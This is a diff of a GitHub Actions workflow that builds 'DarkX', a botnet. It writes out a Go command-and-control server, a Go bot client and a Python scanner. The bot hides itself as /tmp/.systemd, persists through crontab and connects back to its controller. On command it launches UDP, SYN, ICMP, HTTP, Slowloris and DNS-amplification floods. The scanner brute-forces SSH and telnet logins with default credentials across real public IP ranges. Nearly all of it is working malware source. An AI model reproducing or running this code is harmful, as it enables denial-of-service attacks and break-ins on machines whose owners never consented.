@@ -47,8 +47,7 @@ jobs:
         echo "Installing ultimate dependencies..."
         sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
         sudo apt install -y nmap masscan hydra john netcat-openbsd netcat-traditional
-        sudo apt install -y hping3 t50 nping tcpdump dnsutils
-        sudo apt install -y build-essential libpcap-dev libnet-dev
+        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
         pip3 install shodan requests paramiko scapy pwntools cryptography colorama bs4 selenium
         pip3 install asyncpg aiohttp telnetlib3
 
@@ -58,12 +57,18 @@ jobs:
         git clone https://github.com/jseidl/GoldenEye.git
         wget -O slowloris.py https://raw.githubusercontent.com/gkbrk/slowloris/master/slowloris.py
         sudo apt install -y httperf
+        # Install nping from nmap source
+        wget https://nmap.org/dist/nmap-7.94.tar.bz2
+        tar xjf nmap-7.94.tar.bz2
+        cd nmap-7.94 && ./configure && make && sudo make install
+        cd ..
 
     - name: Create CNC Server
       run: |
         cd darkx
         cat > cnc_server.go << 'EOF'
         package main
+        
         import (
             "bufio"
             "fmt"
@@ -73,20 +78,24 @@ jobs:
             "strings"
             "sync"
         )
+        
         type Bot struct {
             Conn net.Conn
             IP   string
             OS   string
         }
+        
         var (
             bots     []Bot
             botMutex sync.Mutex
         )
+        
         func main() {
             fmt.Println("Starting DarkX CNC Server...")
             go startUserServer()
             startBotServer()
         }
+        
         func startUserServer() {
             port := getEnv("CNC_PORT", "5555")
             listener, _ := net.Listen("tcp", ":"+port)
@@ -96,6 +105,7 @@ jobs:
                 go handleUserConnection(conn)
             }
         }
+        
         func startBotServer() {
             port := getEnv("BOT_PORT", "4444")
             listener, _ := net.Listen("tcp", ":"+port)
@@ -105,13 +115,16 @@ jobs:
                 go handleBotConnection(conn)
             }
         }
+        
         func handleUserConnection(conn net.Conn) {
             defer conn.Close()
             reader := bufio.NewReader(conn)
+            
             conn.Write([]byte("DarkX Ultimate CNC\nUsername: "))
             username, _ := reader.ReadString('\n')
             conn.Write([]byte("Password: "))
             password, _ := reader.ReadString('\n')
+            
             if strings.TrimSpace(username) == "admin" && strings.TrimSpace(password) == "darkx2024" {
                 conn.Write([]byte("Authentication successful!\n"))
                 showDashboard(conn, reader)
@@ -119,11 +132,13 @@ jobs:
                 conn.Write([]byte("Authentication failed!\n"))
             }
         }
+        
         func showDashboard(conn net.Conn, reader *bufio.Reader) {
             for {
                 conn.Write([]byte("darkx> "))
                 cmd, _ := reader.ReadString('\n')
                 cmd = strings.TrimSpace(cmd)
+                
                 if cmd == "bots" {
                     botMutex.Lock()
                     conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
@@ -138,6 +153,7 @@ jobs:
                         target := parts[2]
                         port := parts[3]
                         duration := parts[4]
+                        
                         botMutex.Lock()
                         for _, bot := range bots {
                             bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s %s\n", method, target, port, duration)))
@@ -155,18 +171,23 @@ jobs:
                 }
             }
         }
+        
         func handleBotConnection(conn net.Conn) {
             defer conn.Close()
             reader := bufio.NewReader(conn)
+            
             bot := Bot{
                 Conn: conn,
                 IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
                 OS:   "linux",
             }
+            
             botMutex.Lock()
             bots = append(bots, bot)
             botMutex.Unlock()
+            
             log.Printf("New bot: %s", bot.IP)
+            
             for {
                 cmd, err := reader.ReadString('\n')
                 if err != nil {
@@ -178,6 +199,7 @@ jobs:
                 }
             }
         }
+        
         func getEnv(key, fallback string) string {
             if value := os.Getenv(key); value != "" {
                 return value
@@ -191,6 +213,7 @@ jobs:
         cd darkx
         cat > bot_client.go << 'EOF'
         package main
+        
         import (
             "bufio"
             "fmt"
@@ -201,15 +224,18 @@ jobs:
             "strings"
             "time"
         )
+        
         var (
             CNC_SERVER = "CNC_IP_PLACEHOLDER"
             CNC_PORT   = "CNC_PORT_PLACEHOLDER"
         )
+        
         func main() {
             if runtime.GOOS == "linux" {
                 exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
                 exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
             }
+            
             for {
                 if connectToCNC() {
                     time.Sleep(30 * time.Second)
@@ -218,15 +244,18 @@ jobs:
                 }
             }
         }
+        
         func connectToCNC() bool {
             conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
             if err != nil {
                 return false
             }
             defer conn.Close()
+            
             scanner := bufio.NewScanner(conn)
             for scanner.Scan() {
                 cmd := scanner.Text()
+                
                 if cmd == "PING" {
                     conn.Write([]byte("PONG\n"))
                 } else if strings.HasPrefix(cmd, "ATTACK") {
@@ -235,16 +264,20 @@ jobs:
             }
             return true
         }
+        
         func executeAttack(cmd string) {
             parts := strings.Split(cmd, " ")
             if len(parts) < 5 {
                 return
             }
+            
             method := parts[1]
             target := parts[2]
             port := parts[3]
             duration := parts[4]
+            
             fmt.Printf("Executing %s attack on %s:%s\n", method, target, port)
+            
             switch method {
             case "udp-flood":
                 launchUDPFlood(target, port, duration)
@@ -262,14 +295,17 @@ jobs:
                 launchUDPFlood(target, port, duration)
             }
         }
+        
         func launchUDPFlood(target, port, duration string) {
             cmd := exec.Command("timeout", duration, "nping", "--udp", "-p", port, "--rate=1000", "--count=0", target)
             cmd.Start()
         }
+        
         func launchSYNFlood(target, port, duration string) {
             cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", target)
             cmd.Start()
         }
+        
         func launchHTTPFlood(target, port, duration string) {
             go func() {
                 endTime := time.Now().Add(parseDuration(duration))
@@ -279,14 +315,17 @@ jobs:
                 }
             }()
         }
+        
         func launchSlowloris(target, port, duration string) {
             cmd := exec.Command("timeout", duration, "python3", "slowloris.py", target, "-p", port)
             cmd.Start()
         }
+        
         func launchICMPFlood(target, duration string) {
             cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", target)
             cmd.Start()
         }
+        
         func launchDNSAmplification(target, duration string) {
             script := fmt.Sprintf(`
                 import socket
@@ -300,6 +339,7 @@ jobs:
             cmd := exec.Command("timeout", duration, "python3", "-c", script)
             cmd.Start()
         }
+        
         func parseDuration(dur string) time.Duration {
             if strings.HasSuffix(dur, "s") {
                 sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
@@ -382,6 +422,7 @@ jobs:
         import threading
         import time
         import subprocess
+        
         class DarkXScanner:
             def __init__(self):
                 self.cnc_ip = "${{ env.TAILSCALE_IP }}"
@@ -392,6 +433,7 @@ jobs:
                     ("root", ""), ("admin", "admin123"), ("root", "12345"),
                     ("support", "support"), ("root", "pass"), ("root", "toor")
                 ]
+                
             def ssh_attack(self, ip):
                 for username, password in self.ssh_credentials:
                     try:
@@ -411,6 +453,7 @@ jobs:
                         return
                     except:
                         continue
+
             def telnet_attack(self, ip):
                 try:
                     tn = telnetlib.Telnet(ip, timeout=10)
@@ -438,11 +481,13 @@ jobs:
                             continue
                 except:
                     pass
+
             def masscan_scan(self):
                 try:
                     subprocess.run(["masscan", "5.78.0.0/16", "-p22,23,80,443,3389,5900", "--rate=1000"], capture_output=True, timeout=300)
                 except:
                     pass
+
             def start_recruitment(self, mode):
                 print(f"Starting {mode} recruitment...")
                 if mode == "passive":
@@ -461,6 +506,7 @@ jobs:
                         ranges = ["5.78.0.0/16", "91.126.0.0/16", "2.145.0.0/16"]
                         for ip_range in ranges:
                             executor.submit(self.masscan_scan)
+
         if __name__ == "__main__":
             scanner = DarkXScanner()
             scanner.start_recruitment("${{ github.event.inputs.recruitment }}")
